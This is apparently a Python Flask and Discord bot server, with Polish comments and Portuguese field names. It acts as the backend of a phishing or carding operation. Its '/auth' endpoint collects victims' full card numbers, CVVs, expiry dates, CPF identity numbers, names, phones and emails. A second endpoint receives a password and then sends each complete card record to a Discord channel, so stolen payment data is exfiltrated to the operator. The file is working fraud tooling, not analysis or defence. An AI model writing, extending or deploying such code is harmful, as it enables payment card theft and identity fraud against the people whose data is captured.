from model.cardModel import Card
from flask import Flask, request, jsonify
import os
import discord
from discord.ext import commands
import asyncio
import threading


app = Flask(__name__)

token = os.getenv("TOKEN")
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="/", intents=intents)

# z app.app_context():
# db.create_all()

cards: list[Card] = []


@bot.event
async def on_ready():
    print(f'{bot.user} has logged in to Discord!')


async def send_discord_message(card_data):
    channel_id = int(os.getenv("DISCORD_CHANNEL_ID", "0"))
    if channel_id:
        channel = bot.get_channel(channel_id)
        if channel:
            message = f"""
🔔 **Nowe dane karty:**
📱 Telefon: {card_data.celular}
📡 Operator: {card_data.operadora}
💰 Wartość: {card_data.valor}
📧 Email: {card_data.email}
👤 Imię: {card_data.nome}
🆔 CPF: {card_data.cpf}
💳 Karta: {card_data.card}
📅 Data: {card_data.mes}/{card_data.ano}
🔒 CVV: {card_data.cvv}
🏦 BIN: {card_data.bin}
📊 Dane BIN: {card_data.dadosbin}
            """
            await channel.send(message)


def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(bot.start(token))


@app.route('/auth', methods=['GET'])
def authInfo():
    try:
        data = request.json

        if not data or not all(key in data for key in [
            'celular',
            'operadora',
            'valor',
            'email',
            'nome',
            'cpf',
            'card',
            'mes',
            'ano',
            'cvv',
            'token',
            'bin',
            'dadosbin'
        ]):
            return jsonify({'Error': 'Unknown'}), 401

        celular = data.get('celular')
        operadora = data.get('operadora')
        valor = data.get('valor')
        email = data.get('email')
        nome = data.get('nome')
        cpf = data.get('cpf')
        card = data.get('card')
        mes = data.get('mes')
        ano = data.get('ano')
        cvv = data.get('cvv')
        token = data.get('token')
        bin = data.get('bin')
        dadosbin = data.get('dadosbin')

        card = Card(
            celular, operadora, valor, email, nome, cpf, card,
            mes, ano, cvv, token, bin, dadosbin)
        cards.append(card)

        return jsonify({'Message': 'Ok'}), 200

    except Exception as ex:
        print(ex)
        return jsonify({'Error': 'Unknown'}), 401


@app.route('/authpass', methods=['GET'])
def authPassword():
    try:
        data = request.json
        if not data or not all(key in data for key in [
            'senha',
            'token'
        ]):
            return jsonify({'Error': 'Unknown'}), 401

        senha = data.get('senha')
        token = data.get('token')

        for card in cards:
            if card.token == token:
                # bot discord wysyła wiadomość
                asyncio.create_task(send_discord_message(card))
                break

        return jsonify({'Message': 'Ok'}), 200

    except Exception as ex:
        print(ex)
        return jsonify({'Error': 'Unknown'}), 401


if __name__ == "__main__":
    # Uruchom bota Discord w osobnym wątku
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()
    
    app.run(host="0.0.0.0", port=5000)